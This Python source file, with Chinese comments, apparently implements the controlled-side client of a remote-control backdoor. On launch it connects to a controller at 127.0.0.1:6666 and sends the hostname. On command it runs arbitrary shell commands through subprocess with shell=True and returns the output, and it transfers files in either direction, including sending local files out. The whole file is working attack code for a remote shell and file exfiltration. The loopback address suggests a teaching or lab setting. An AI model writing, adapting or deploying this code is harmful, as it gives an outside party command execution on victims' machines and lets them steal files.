#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import struct
import os
import subprocess

# 文件下载函数
def download_file(client_socket):
    try:
        # 先接收文件的信息，进行解析
        file_info = client_socket.recv(struct.calcsize('128sl'))
        if file_info:
            # 按照同样的格式（128sl）进行拆包
            file_name, file_size = struct.unpack('128sl', file_info)
            # 去除文件名后面多余的空字符
            file_name = file_name.decode().strip('\00')
            # 定义下载文件的存放路径，./ 表示当前目录下
            new_file_name = os.path.join('./', file_name)
            print(f'[+] 文件信息接收完成！文件名: {file_name}  大小: {file_size}')

            # 开始接收文件内容
            print('[+] 开始接收...')
            received_size = 0
            with open(new_file_name, 'wb') as f:
                while received_size < file_size:
                    if file_size - received_size > 1024:
                        data = client_socket.recv(1024)
                        f.write(data)
                        received_size += len(data)
                    else:
                        # 剩下内容不足 1024 时，接收剩余全部内容并写入
                        data = client_socket.recv(file_size - received_size)
                        f.write(data)
                        received_size = file_size
                        break
            print("[+] 文件接收完成！")
    except Exception as e:
        print(f"文件下载出错: {e}")

# 文件上传函数
def upload_file(client_socket, file_path):
    try:
        if os.path.isfile(file_path):
            # 先传输文件信息，防止粘包
            file_info = struct.pack('128sl', bytes(os.path.basename(file_path).encode('utf-8')), os.stat(file_path).st_size)
            client_socket.sendall(file_info)
            print(f'[+] 文件信息发送成功！文件名: {os.path.basename(file_path)}  大小: {os.stat(file_path).st_size}')

            # 开始传输文件内容
            print('[+] 开始上传...')
            with open(file_path, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        print("[+] 文件上传完成！")
                        break
                    client_socket.sendall(data)
    except Exception as e:
        print(f"文件上传出错: {e}")

# 文件传输函数
def transfer_files(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            # 进行命令、参数的分割
            command_list = command.split()
            if not command_list:
                continue
            if command_list[0] == 'exit':
                break
            # 若方法为 download，表示主控端需要获取被控端的文件
            elif command_list[0] == 'download':
                upload_file(client_socket, command_list[1])
            elif command_list[0] == 'upload':
                download_file(client_socket)
        except Exception as e:
            print(f"文件传输出错: {e}")

# 命令执行函数
def exe_command(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            # 将接收到的命令进行命令、参数分割
            command_list = command.split()
            # 接收到 exit 时退出命令执行功能
            if command_list[0] == 'exit':
                break
            # 执行 cd 的时候不能直接通过 subprocess 进行切换目录
            # 会出现 [Errno 2] No such file or directory 错误，要通过 os.chdir 来切换目录
            elif command_list[0] == 'cd':
                os.chdir(command_list[1])
                # 切换完毕后，发给主控端当前被控端的工作路径
                client_socket.sendall(os.getcwd().encode())
            else:
                command_processed = subprocess.run(command_list, shell=True, stdout=subprocess.PIPE, universal_newlines=True)
                client_socket.sendall(command_processed.stdout.encode())
        except Exception as message:
            # 出现异常时进行捕获，并通知主控端
            client_socket.sendall(str(message).encode())

if __name__ == '__main__':
    # 连接主控端
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('127.0.0.1', 6666))
    # 发送被控端的主机名
    host_name = subprocess.check_output("hostname")
    client_socket.sendall(host_name)

    # 等待主控端指令
    print("[*] 等待指令...")
    while True:
        try:
            # 接收主控端的指令，并进入相应的模块
            instruction = client_socket.recv(10).decode()
            if instruction == '1':
                exe_command(client_socket)
            elif instruction == '2':
                transfer_files(client_socket)
            elif instruction == 'exit':
                break
            else:
                pass
        except Exception as e:
            print(f"接收指令出错: {e}")
            break

    client_socket.close()